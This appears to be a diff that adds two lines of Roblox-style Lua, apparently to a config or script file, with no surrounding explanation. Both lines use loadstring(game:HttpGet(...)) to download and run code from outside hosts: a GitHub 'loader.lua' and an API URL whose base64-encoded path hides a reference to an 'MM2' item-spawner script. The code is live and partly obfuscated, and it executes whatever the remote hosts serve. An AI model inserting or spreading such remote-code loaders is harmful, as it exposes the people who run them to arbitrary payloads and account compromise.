@@ -1,0 +1,2 @@
+RUN_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/genasscripts/checker/refs/heads/main/loader.lua"));
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjcyOWRiZmVlLTM4NTItNDNlMy05NThhLTA3MTQ2MWZhMmNmYiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYmVzdHZpc3VhbG1hbi9NTTIvcmVmcy9oZWFkcy9tYWluL0l0ZW1TcGF3bmVyLmx1YSJ9fQ"))();
